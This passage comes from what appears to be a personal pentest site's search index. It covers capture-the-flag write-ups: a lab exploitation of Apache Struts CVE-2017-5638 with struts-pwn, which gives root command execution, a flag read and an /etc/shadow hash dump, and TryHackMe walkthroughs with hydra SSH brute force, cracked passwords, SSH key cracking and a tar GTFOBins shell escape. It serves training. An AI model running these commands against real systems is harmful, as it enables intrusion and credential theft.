https://nmap.org/submit/ .\n# Nmap done at Thu Nov  2 21:12:59 2023 -- 1 IP address (1 host up) scanned in 34.95 seconds\n</code></pre> <p>We can see here, there is port <code>8080</code> which is proxy-server. It connected to the machine directly.</p>","tags":["apache-struts"]},{"location":"writeup/random/oxygen/#udp","title":"UDP","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/\u2026/Desktop/internship/oxygen/nmap]\n\u2514\u2500# cat udpscan.txt \n# Nmap 7.94 scan initiated Thu Nov  2 21:12:58 2023 as: nmap -sU -T4 -vv -o nmap/udpscan.txt 192.168.8.114\nIncreasing send delay for 192.168.8.114 from 0 to 50 due to 11 out of 11 dropped probes since last increase.\nIncreasing send delay for 192.168.8.114 from 50 to 100 due to 11 out of 11 dropped probes since last increase.\nIncreasing send delay for 192.168.8.114 from 100 to 200 due to 11 out of 11 dropped probes since last increase.\nIncreasing send delay for 192.168.8.114 from 200 to 400 due to 11 out of 11 dropped probes since last increase.\nIncreasing send delay for 192.168.8.114 from 400 to 800 due to 11 out of 11 dropped probes since last increase.\nIncreasing send delay for 192.168.8.114 from 800 to 1000 due to 11 out of 11 dropped probes since last increase.\nNmap scan report for 192.168.8.114\nHost is up, received reset ttl 128 (0.00083s latency).\nScanned at 2023-11-02 21:13:11 EDT for 1599s\nAll 1000 scanned ports on 192.168.8.114 are in ignored states.\nNot shown: 1000 open|filtered udp ports (no-response)\n\nRead data files from: /usr/bin/../share/nmap\n# Nmap done at Thu Nov  2 21:39:50 2023 -- 1 IP address (1 host up) scanned in 1612.59 seconds\n</code></pre>","tags":["apache-struts"]},{"location":"writeup/random/oxygen/#enumeration","title":"Enumeration","text":"","tags":["apache-struts"]},{"location":"writeup/random/oxygen/#web-page","title":"Web page","text":"<p>We go to the web page and suddenly <code>/showcase.action</code> will open as also shown on nmap. Emm interesting here, but we keep on enumerate if something related to <code>CVE</code> or injection, file upload or anything. Directly we doing directory brute.</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/\u2026/Desktop/internship/oxygen/nmap]\n\u2514\u2500# dirb http://192.168.8.114:8080/        \n\n-----------------\nDIRB v2.22    \nBy The Dark Raver\n-----------------\n\nSTART_TIME: Fri Nov  3 03:01:42 2023\nURL_BASE: http://192.168.8.114:8080/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612                                                          \n\n---- Scanning URL: http://192.168.8.114:8080/ ----\n+ http://192.168.8.114:8080/date (CODE:200|SIZE:11244)                            \n+ http://192.168.8.114:8080/docs (CODE:302|SIZE:0)                                \n+ http://192.168.8.114:8080/examples (CODE:302|SIZE:0)                            \n+ http://192.168.8.114:8080/host-manager (CODE:302|SIZE:0)                        \n+ http://192.168.8.114:8080/manager (CODE:302|SIZE:0)                             \n+ http://192.168.8.114:8080/toggle (CODE:200|SIZE:191)                            \n+ http://192.168.8.114:8080/tree (CODE:200|SIZE:907)                             \n\n-----------------\nEND_TIME: Fri Nov  3 03:02:27 2023\nDOWNLOADED: 4612 - FOUND: 7\n</code></pre> <p>Doing some directory brute using feroxbuster or dirb, we got something interesting. So I just go thru this directory. On directory docs, there is something that we can look up to which is <code>version</code> of the web pages <code>Version 9.0.0</code></p> <p></p> <p>So how about we find on the google if there is public exploit already. </p> <p></p> <p>There is something that we can do on here, but I dont try it because suddenly come into my mind that what if I search for the web pages title itself which is <code>Apache Struts</code> </p> <p></p> <p></p> <p>Open and read the PoC and this article said something interesting https://medium.com/@lucideus/exploiting-apache-struts2-cve-2017-5638-lucideus-research-83adb9490ede</p> <p>We read and try to understand this CVE. we bump up to this article</p> <p>https://nvd.nist.gov/vuln/detail/CVE-2017-5638</p> <p>On this article it said that Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message generation during file-upload attempts, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header, as exploited in the wild in March 2017 with a Content-Type header containing a #cmd= string. According to Apache, the vulnerability exists in the\u00a0Jakarta Multipart\u00a0parser</p> <p>Back to the medium blog, to check whether the application is vulnerable or not. We can try to scan it using <code>nmap</code> like this</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/\u2026/Desktop/internship/oxygen/nmap]\n\u2514\u2500# nmap -p 8080 --script http-vuln-cve2017-5638 --script-args path=/showcase.action 192.168.8.114\nStarting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 03:37 EDT\nNmap scan report for 192.168.8.114\nHost is up (0.0022s latency).\n\nPORT     STATE SERVICE\n8080/tcp open  http-proxy\n| http-vuln-cve2017-5638: \n|   VULNERABLE:\n|   Apache Struts Remote Code Execution Vulnerability\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-5638\n|       Apache Struts 2.3.5 - Struts 2.3.31 and Apache Struts 2.5 - Struts 2.5.10 are vulnerable to a Remote Code Execution\n|       vulnerability via the Content-Type header.\n|           \n|     Disclosure date: 2017-03-07\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638\n|       https://cwiki.apache.org/confluence/display/WW/S2-045\n|_      http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html\n\nNmap done: 1 IP address (1 host up) scanned in 13.32 seconds\n</code></pre> <p>Here we can see, the application is vulnerable.</p>","tags":["apache-struts"]},{"location":"writeup/random/oxygen/#exploitation","title":"Exploitation","text":"<p>For the exploitation part, I will be using this script https://github.com/mazen160/struts-pwn </p> <p>On this script it added a Content type header that will open the <code>cmd</code> and we can give a command to find something interesting.</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/\u2026/Desktop/internship/oxygen/struts-pwn]\n\u2514\u2500# python struts-pwn.py --url 'http://192.168.8.114:8080/showcase.action' -c 'id'\n\n[*] URL: http://192.168.8.114:8080/showcase.action\n[*] CMD: id\n[!] ChunkedEncodingError Error: Making another request to the url.\nRefer to: https://github.com/mazen160/struts-pwn/issues/8 for help.\nEXCEPTION::::--&gt; (\"Connection broken: InvalidChunkLength(got length b'', 0 bytes read)\", InvalidChunkLength(got length b'', 0 bytes read))\nNote: Server Connection Closed Prematurely\n\nuid=0(root) gid=0(root) groups=0(root)\n\n[%] Done.\n</code></pre> <p>We can see here, directly the <code>id</code> is <code>root</code>. So it will be easy for us to find the flag because there is no need to do the reverse shell and escalate to the root. </p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/\u2026/Desktop/internship/oxygen/struts-pwn]\n\u2514\u2500# python struts-pwn.py --url 'http://192.168.8.114:8080/showcase.action' -c 'find / -name \"flag.txt\" 2&gt;/dev/null'\n\n[*] URL: http://192.168.8.114:8080/showcase.action\n[*] CMD: find / -name \"flag.txt\" 2&gt;/dev/null\n[!] ChunkedEncodingError Error: Making another request to the url.\nRefer to: https://github.com/mazen160/struts-pwn/issues/8 for help.\nEXCEPTION::::--&gt; (\"Connection broken: InvalidChunkLength(got length b'', 0 bytes read)\", InvalidChunkLength(got length b'', 0 bytes read))\nNote: Server Connection Closed Prematurely\n\n/var/secret/flag.txt\n\n[%] Done.\n</code></pre> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/\u2026/Desktop/internship/oxygen/struts-pwn]\n\u2514\u2500# python struts-pwn.py --url 'http://192.168.8.114:8080/showcase.action' -c 'cat /var/secret/flag.txt'\n\n[*] URL: http://192.168.8.114:8080/showcase.action\n[*] CMD: cat /var/secret/flag.txt\n[!] ChunkedEncodingError Error: Making another request to the url.\nRefer to: https://github.com/mazen160/struts-pwn/issues/8 for help.\nEXCEPTION::::--&gt; (\"Connection broken: InvalidChunkLength(got length b'', 0 bytes read)\", InvalidChunkLength(got length b'', 0 bytes read))\nNote: Server Connection Closed Prematurely\n\nflag{7fc4b2162cc4d91d5ababf66c968380d}\n\n[%] Done.\n</code></pre> <p>We got the flag.</p>","tags":["apache-struts"]},{"location":"writeup/random/oxygen/#bonus","title":"Bonus","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/\u2026/Desktop/internship/oxygen/struts-pwn]\n\u2514\u2500# python struts-pwn.py --url 'http://192.168.8.114:8080/showcase.action' -c 'cat /etc/shadow'\n\n[*] URL: http://192.168.8.114:8080/showcase.action\n[*] CMD: cat /etc/shadow\n[!] ChunkedEncodingError Error: Making another request to the url.\nRefer to: https://github.com/mazen160/struts-pwn/issues/8 for help.\nEXCEPTION::::--&gt; (\"Connection broken: InvalidChunkLength(got length b'', 0 bytes read)\", InvalidChunkLength(got length b'', 0 bytes read))\nNote: Server Connection Closed Prematurely\n\nroot:$6$2G8KrtUL$hxJuBdQdvFWqWKwzzudZ.P/JYlQGAQAPlzPZhoODv2Kdig8X4VqFXF63DkGUK1osqDpdiCKqjala/YM3h9vka.:17947:0:99999:7:::\ndaemon:*:17945:0:99999:7:::\nbin:*:17945:0:99999:7:::\nsys:*:17945:0:99999:7:::\nsync:*:17945:0:99999:7:::\ngames:*:17945:0:99999:7:::\nman:*:17945:0:99999:7:::\nlp:*:17945:0:99999:7:::\nmail:*:17945:0:99999:7:::\nnews:*:17945:0:99999:7:::\nuucp:*:17945:0:99999:7:::\nproxy:*:17945:0:99999:7:::\nwww-data:*:17945:0:99999:7:::\nbackup:*:17945:0:99999:7:::\nlist:*:17945:0:99999:7:::\nirc:*:17945:0:99999:7:::\ngnats:*:17945:0:99999:7:::\nnobody:*:17945:0:99999:7:::\nsystemd-timesync:*:17945:0:99999:7:::\nsystemd-network:*:17945:0:99999:7:::\nsystemd-resolve:*:17945:0:99999:7:::\nsystemd-bus-proxy:*:17945:0:99999:7:::\n_apt:*:17945:0:99999:7:::\nmessagebus:*:17945:0:99999:7:::\njimmy:$6$4zCTIlcp$OcsDPbTu9a7tQammSKsLVUj2uXaFIeE3EGNOSMf0RnAgzMXGDaGneYyyb2Q1xdZ098taNijyid2VQEg8Es0Jc/:17946:0:99999:7:::\nsshd:*:17945:0:99999:7:::\n\n[%] Done.\n</code></pre> <p>If the <code>id</code> is not root, we can try to find the hash file contains of the password and use the <code>hashcat</code> password cracking. And also we can try using the reverse shell that related to this application. </p>","tags":["apache-struts"]},{"location":"writeup/tryhackme/machines/easy/basicpentesting/","title":"Basic Pentesting","text":"","tags":["enum4linux","hydra","linpeas","gtfobins","ssh-key","john"]},{"location":"writeup/tryhackme/machines/easy/basicpentesting/#recon","title":"Recon","text":"<ul> <li>nmap scanning nmap -p- --min-rate 5000 $IP nmap -sV -sC -p 22,80,139,445,8009,8080 -oN nmap/tcpscan.txt $IP</li> </ul>","tags":["enum4linux","hydra","linpeas","gtfobins","ssh-key","john"]},{"location":"writeup/tryhackme/machines/easy/basicpentesting/#enumeration","title":"Enumeration","text":"<p>gobuster dir -u http://$IP -w /opt/tools/SecLists/Discovery/Web-Content/big.txt enum4linux -a $IP | tee enum4linux.txt</p>","tags":["enum4linux","hydra","linpeas","gtfobins","ssh-key","john"]},{"location":"writeup/tryhackme/machines/easy/basicpentesting/#exploitation","title":"Exploitation","text":"<p><code>hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://$IP</code> username = jan password = armando</p>","tags":["enum4linux","hydra","linpeas","gtfobins","ssh-key","john"]},{"location":"writeup/tryhackme/machines/easy/basicpentesting/#privesc","title":"Privesc","text":"<p><code>python3 -m http.server 80</code> transfer linpeas.sh sudo -l <code>find / -user root -perm /4000 2&gt;/dev/null</code> gtfobins pkexec then tengok balik linpeas ada /home/kay/.ssh/id_rsa cat file then try login but it ask for passphrase ssh2john id_rsa &gt; kay.txt  <code>john kay.txt --wordlist=/usr/share/wordlists/rockyou.txt</code> john --show kay.txt password = beeswax</p> <p>login and cat pass.bak</p>","tags":["enum4linux","hydra","linpeas","gtfobins","ssh-key","john"]},{"location":"writeup/tryhackme/machines/easy/bountyhacker/","title":"Bounty Hacker","text":"","tags":["ftp","gobuster","hydra","linpeas","gtfobins"]},{"location":"writeup/tryhackme/machines/easy/bountyhacker/#recon","title":"Recon","text":"<p>nmap -p- --min-rate 5000 $IP nmap -sCV -p 21,22,80 $IP</p>","tags":["ftp","gobuster","hydra","linpeas","gtfobins"]},{"location":"writeup/tryhackme/machines/easy/bountyhacker/#enumeration","title":"Enumeration","text":"<p>masuk web, godek2 try fuzzing directory. takde apa2 ftp $IP get all the file in ftp using <code>get</code> </p>","tags":["ftp","gobuster","hydra","linpeas","gtfobins"]},{"location":"writeup/tryhackme/machines/easy/bountyhacker/#exploitation","title":"Exploitation","text":"<p><code>hydra -l lin -P locks.txt ssh://$IP</code></p>","tags":["ftp","gobuster","hydra","linpeas","gtfobins"]},{"location":"writeup/tryhackme/machines/easy/bountyhacker/#privesc","title":"Privesc","text":"<p>letak linpeas sudo pkexec /bin/sh xberjaya sudo -l tar gtfobins <code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></p>","tags":["ftp","gobuster","hydra","linpeas","gtfobins"]},{"location":"tags/","title":"Tags","text":"<p>Following is a list of relevant tags:</p>"},{"location":"tags/#apache-struts","title":"apache-struts","text":"<ul> <li>Oxygen</li> </ul>"},{"location":"tags/#cheatsheet","title":"cheatsheet","text":"<ul> <li>Cheatsheet</li> <li>Volatility</li> <li>Tools</li> <li>Web pentest checklist</li> </ul>"},{"location":"tags/#cve","title":"cve","text":"<ul> <li>Analytics</li> <li>Codify</li> </ul>"},{"location":"tags/#enum4linux","title":"enum4linux","text":"<ul> <li>Codify</li> <li>Basic Pentesting</li> </ul>"},{"location":"tags/#ftp","title":"ftp","text":"<ul> <li>Hidrogen</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#gobuster","title":"gobuster","text":"<ul> <li>Analytics</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#gtfobins","title":"gtfobins","text":"<ul> <li>Hidrogen</li> <li>Basic Pentesting</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#hashcat","title":"hashcat","text":"<ul> <li>Codify</li> </ul>"},{"location":"tags/#hydra","title":"hydra","text":"<ul> <li>Basic Pentesting</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#john","title":"john","text":"<ul> <li>Codify</li> <li>Basic Pentesting</li> </ul>"},{"location":"tags/#linpeas","title":"linpeas","text":"<ul> <li>Analytics</li> <li>Codify</li> <li>Butane</li> <li>Hidrogen</li> <li>Napalm</li> <li>Basic Pentesting</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#lse","title":"lse","text":"<ul> <li>Butane</li> </ul>"},{"location":"tags/#mysql","title":"mysql","text":"<ul> <li>Hidrogen</li> </ul>"},{"location":"tags/#nfs","title":"nfs","text":"<ul> <li>Napalm</li> </ul>"},{"location":"tags/#pnwkit","title":"pnwkit","text":"<ul> <li>Butane</li> </ul>"},{"location":"tags/#pspy64","title":"pspy64","text":"<ul> <li>Codify</li> </ul>"},{"location":"tags/#pwnkit","title":"pwnkit","text":"<ul> <li>Napalm</li> </ul>"},{"location":"tags/#rce","title":"rce","text":"<ul> <li>Hidrogen</li> </ul>"},{"location":"tags/#snmpwalk","title":"snmpwalk","text":"<ul> <li>Butane</li> </ul>"},{"location":"tags/#ssh-key","title":"ssh-key","text":"<ul> <li>Napalm</li> <li>Basic Pentesting</li> </ul>"},{"location":"tags/#udp","title":"udp","text":"<ul> <li>Butane</li> </ul>"},{"location":"tags/#wpscan","title":"wpscan","text":"<ul> <li>Hidrogen</li> </ul>"}]}